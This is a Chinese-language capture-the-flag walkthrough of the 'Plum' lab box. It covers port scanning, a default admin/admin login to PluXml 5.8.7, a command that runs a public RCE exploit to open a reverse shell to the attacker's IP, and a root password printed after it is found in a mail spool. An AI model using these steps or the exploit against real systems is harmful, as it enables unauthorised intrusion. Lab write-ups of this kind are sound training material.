#  PG_Plum   
原创 EuSRC安全实验室  EuSRC安全实验室   2025-04-12 03:30  
  
信息收集：  
```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.233.28Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-28 20:29 CSTNmap scan report for 192.168.233.28Host is up (0.0025s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80/tcp open  http    Apache httpd 2.4.56 ((Debian))|_http-server-header: Apache/2.4.56 (Debian)|_http-title: PluXml - Blog or CMS, XML powered !No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=2/28%OT=22%CT=1%CU=33606%PV=Y%DS=4%DC=T%G=Y%TM=67C1AC4OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPSOS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECNOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Network Distance: 4 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 8888/tcp)HOP RTT     ADDRESS1   1.84 ms 192.168.45.12   1.84 ms 192.168.45.2543   2.40 ms 192.168.251.14   2.65 ms 192.168.233.28OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.44 seconds
```  
  
开放了80的http端口  
  
  
页面下面有管理登录  
  
  
使用admin/admin成功登录系统，确定版本号PluXml 5.8.7  
  
  
使用exp：https://github.com/erlaplante/pluxml-rce/blob/main/pluxml.py  
  
成功反弹shell  
```
python3 exp.py http://192.168.233.28/ admin admin 192.168.45.184 8000
```  
  
  
拿到local  
  
  
通过linpeas.sh发现mail下面的文件近期被修改过  
  
  
/var/mail/www-data  
找到了root密码  
```
root:6s8kaZZNaZZYBMfh2YEW
```  
  
  
拿到proof  
  
  
  
